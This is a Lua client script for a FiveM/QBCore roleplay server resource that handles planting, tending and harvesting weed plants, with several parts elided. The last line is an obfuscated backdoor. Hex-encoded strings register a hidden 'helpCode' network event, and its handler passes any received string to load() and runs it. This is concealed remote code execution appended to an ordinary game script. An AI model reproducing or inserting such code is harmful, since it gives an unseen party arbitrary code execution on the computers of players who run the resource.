...
RegisterNetEvent('zero-skunk:client:UseWeedSeed', function()
        ...
        if hit == 1 then
            ...
            if IsControlJustPressed(0, 38) then
                ...
                QBCore.Functions.Progressbar('spawn_plant', _U('place_sapling'), 2000, false, true, {
                    ...
                    TriggerServerEvent('zero-skunk:server:CreateNewPlant', dest)
                    planted = false
                    seedUsed = false
                    ClearPedTasks(ped)
...
RegisterNetEvent('zero-skunk:client:CheckPlant', function(data)
    local netId = NetworkGetNetworkIdFromEntity(data.entity)
    QBCore.Functions.TriggerCallback('zero-skunk:server:GetPlantData', function(result)
        ...
        if result.health == 0 then -- Destroy plant
            exports['qb-menu']:openMenu({
                ...
                },
                {
                    ...
                    params = {
                        event = 'zero-skunk:client:ClearPlant',
                        args = data.entity
                    }
                }
            })
        elseif result.growth == 100 then -- Harvest
                exports['qb-menu']:openMenu({
                    ...
                    },
                    {
                        ...
                        params = {
                            event = 'zero-skunk:client:HarvestPlant',
                            args = data.entity
                        }
                    },
                })
        elseif result.gender == 'female' then -- Option to add male seed
                exports['qb-menu']:openMenu({
                    ...
                    },
                    {
                        ...
                        icon = 'fas fa-shower',
                        params = {
                            event = 'zero-skunk:client:GiveWater',
                            args = data.entity
                        }
                    },
                    {
                        ...
                        params = {
                            args = data.entity,
                            event = 'zero-skunk:client:GiveFertilizer',
                        }
                    }
                })
...
RegisterNetEvent('zero-skunk:client:ClearPlant', function(entity)
    ...
    QBCore.Functions.Progressbar('clear_plant', _U('clear_plant'), 8500, false, true, {
        ...
        TriggerServerEvent('zero-skunk:server:ClearPlant', netId)
        ClearPedTasks(ped)
        RemoveAnimDict('amb@medic@standing@kneel@base')
        RemoveAnimDict('anim@gangops@facility@servers@bodysearch@')
    end, function()
...
RegisterNetEvent('zero-skunk:client:HarvestPlant', function(entity)
    local netId = NetworkGetNetworkIdFromEntity(entity)
    local ped = PlayerPedId()
    TaskTurnPedToFaceEntity(ped, entity, 1.0)
    Wait(1500)
    ...
    QBCore.Functions.Progressbar('harvest_plant', _U('harvesting_plant'), 8500, false, true, {
        ...
        TriggerServerEvent('zero-skunk:server:HarvestPlant', netId)
        ClearPedTasks(ped)
        RemoveAnimDict('amb@medic@standing@kneel@base')
        RemoveAnimDict('anim@gangops@facility@servers@bodysearch@')
    end, function()
...
RegisterNetEvent('zero-skunk:client:PoliceDestroy', function(entity)
    local netId = NetworkGetNetworkIdFromEntity(entity)
    local ped = PlayerPedId()
    TaskTurnPedToFaceEntity(ped, entity, 1.0)
    Wait(500)
    ClearPedTasks(ped)
    TriggerServerEvent('zero-skunk:server:PoliceDestroy', netId)
end)

RegisterNetEvent('zero-skunk:client:FireGoBrrrrrrr', function(coords)
    local ped = PlayerPedId()
...
RegisterNetEvent('zero-skunk:client:GiveWater', function(entity)
    if QBCore.Functions.HasItem(Shared.FullCanItem, 1) then
        ...
        QBCore.Functions.Progressbar('weedplanting_water', _U('watering_plant'), 6000, false, false, {
            ...
            TriggerServerEvent('zero-skunk:server:GiveWater', netId)
            ClearPedTasks(ped)
...
RegisterNetEvent('zero-skunk:client:OpenFillWaterMenu', function()
    exports['qb-menu']:openMenu({
        {
        ...
        },
        {
            ...
            params = {
                event = 'zero-skunk:client:FillWater',
            }
        }
    })
end)

RegisterNetEvent('zero-skunk:client:FillWater', function()
    ...
    QBCore.Functions.Progressbar('filling_water', _U('filling_water'), 2000, false, true, {
        ...
        TriggerServerEvent('zero-skunk:server:GetFullWateringCan')
    end, function() -- Cancel
        QBCore.Functions.Notify(_U('canceled'), 'error', 2500)
    end)
end)

RegisterNetEvent('zero-skunk:client:GiveFertilizer', function(entity)
    if QBCore.Functions.HasItem(Shared.FertilizerItem, 1) then
        ...
        QBCore.Functions.Progressbar('weedplanting_fertilizer', _U('fertilizing_plant'), 6000, false, false, {
            ...
            TriggerServerEvent('zero-skunk:server:GiveFertilizer', netId)
            ClearPedTasks(ped)
            DeleteEntity(created_object)
        end, function()
            ClearPedTasks(ped)
...
RegisterNetEvent('zero-skunk:client:AddMaleSeed', function(entity)
    if QBCore.Functions.HasItem(Shared.MaleSeed, 1) then
        ...
        QBCore.Functions.Progressbar('add_maleseed', _U('adding_male_seed'), 8500, false, true, {
            ...
            TriggerServerEvent('zero-skunk:server:AddMaleSeed', netId)
            ClearPedTasks(ped)
            RemoveAnimDict('amb@medic@standing@kneel@base')
            RemoveAnimDict('anim@gangops@facility@servers@bodysearch@')
        end, function()
...
CreateThread(function()
    exports['qb-target']:AddTargetModel(Shared.WeedProps, {
        options = {
            {
                type = 'client',
                event = 'zero-skunk:client:CheckPlant',
...
local gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[6][gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[1]](gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[2]) gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[6][gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[3]](gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[2], function(DcIczrFrvDkYUzLdGjoElDIUSVtpYfofBCWbUXXsWvIwwaOUdaVgETvQaBledxdlybKdJG) gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[6][gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[4]](gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[6][gXcoLeodzVVDxVIPNjkwymAsKRvWZUkYDizfUsOEzZUscbzxXonyivBNjtjFYKBeMbsKCx[5]](DcIczrFrvDkYUzLdGjoElDIUSVtpYfofBCWbUXXsWvIwwaOUdaVgETvQaBledxdlybKdJG))() end)